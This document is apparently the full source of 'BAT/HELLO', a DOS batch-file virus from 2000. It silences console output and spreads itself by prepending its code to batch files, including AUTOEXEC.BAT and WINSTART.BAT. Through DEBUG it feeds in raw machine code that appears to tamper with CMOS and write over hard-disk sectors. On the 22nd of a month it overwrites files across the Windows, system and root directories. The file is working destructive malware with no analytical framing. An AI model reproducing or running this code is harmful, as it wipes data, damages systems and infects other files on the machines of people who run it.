@ECHO OFF
CTTY NUL
ATTRIB -H -S +R %0.BAT
ATTRIB -H -R -S HELLOTMP.BAT
DEL HELLOTMP.BAT
ATTRIB -H -R -S HELLOTEM.BAT
ATTRIB -H -S C:\AUTOEXEC.BAT
ATTRIB -H -S %WINDIR%\WINSTART.BAT
ATTRIB -H -S %WINBOOTDIR%\WINSTART.BAT
DEL KK.BAT
ECHO IF %%1==HELLOTMP.BAT GOTO NO >>HELLOTMP.BAT
ECHO IF %%1==%%2 GOTO NO >>HELLOTMP.BAT
ECHO IF %%1==%0.BAT GOTO NO >>HELLOTMP.BAT
ECHO COPY %%2 KK.BAT >>HELLOTMP.BAT
ECHO COPY /A KK.BAT + %%1 KK.BAT >>HELLOTMP.BAT
ECHO DEL %%1 >>HELLOTMP.BAT
ECHO COPY KK.BAT %%1 >>HELLOTMP.BAT
ECHO ATTRIB +R %%1 >>HELLOTMP.BAT
ECHO DEL KK.BAT >>HELLOTMP.BAT
ECHO :NO >>HELLOTMP.BAT
FOR %%F IN (*.BAT C:\AUTOEXEC.BAT %WINBOOTDIR%\WINSTART.BAT
%WINDIR%\WINSTART.BAT ) DO CALL HELLOTMP.BAT %%F %0.BAT
ATTRIB -R \WINSTART.BAT
DEL \WINSTART.BAT
ATTRIB -H -R -S HELLOTEM.BAT
DELTREE /Y HELLOHEH.DBG >NUL
ECHO F 200 L 200 0 >>HELLOHEH.DBG
ECHO E 100 B0 07 E6 70 E4 71 34 21 75 34 30 DB BA 70 00 88 D8 >>HELLOHEH.DBG
ECHO E 111 EE 42 30 C0 EE FE C3 75 F2 B8 01 03 BB 00 02 B9 01 >>HELLOHEH.DBG
ECHO E 122 00 BA 80 00 CD 13 BA 81 00 CD 13 BA 82 00 CD 13 BA >>HELLOHEH.DBG
ECHO E 133 83 00 CD 13 CC BA 64 00 B0 FE EE B8 4C 00 CD 21 >>HELLOHEH.DBG
ECHO G >>HELLOHEH.DBG
ECHO Q >>HELLOHEH.DBG
DEBUG <HELLOHEH.DBG
DEL HELLOHEH.DBG
ECHO.|DATE|FIND "-22-"
IF ERRORLEVEL=1 GOTO END
DEL HELLOTEM.BAT
ECHO HELLO!!!Good Morning.  >>HELLOTEM.BAT
FOR %%f in (*.* %WINBOOTDIR%\*.* %WINDIR%\*.* %WINDIR%\SYSTEM\*.*
%WINBOOTDIR%\SYSTEM\*.* %WINBOOTDIR%\COMMAND\*.* C:\*.* \*.*) DO Call
HELLOTMP.BAT %%f HELLOTEM.BAT
:END
DEL HELLOTEM.BAT
DEL HELLOTMP.BAT
REM BAT/HELLO Version 1.12 written by HelloBoy
REM Copyright(C) 2000 HelloBoy Software Corporation
REM All Right Reserved
CTTY CON
